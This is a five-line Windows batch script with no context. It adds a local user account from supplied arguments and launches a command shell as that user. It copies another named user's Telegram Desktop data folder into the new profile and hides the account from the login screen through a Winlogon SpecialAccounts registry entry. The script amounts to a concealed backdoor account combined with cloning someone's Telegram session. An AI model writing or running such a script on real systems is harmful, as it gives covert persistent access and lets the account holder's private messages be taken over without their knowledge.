net user %1 %2 /add
runas /env /profile /user:%1 cmd.exe
mkdir "c:\users\%1\appdata\roaming\Telegram Desktop\"
copy "c:\users\yuksel\appdata\roaming\telegram desktop" "c:\users\%1\appdata\roaming\Telegram Desktop\"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %1 /t REG_DWORD /d 0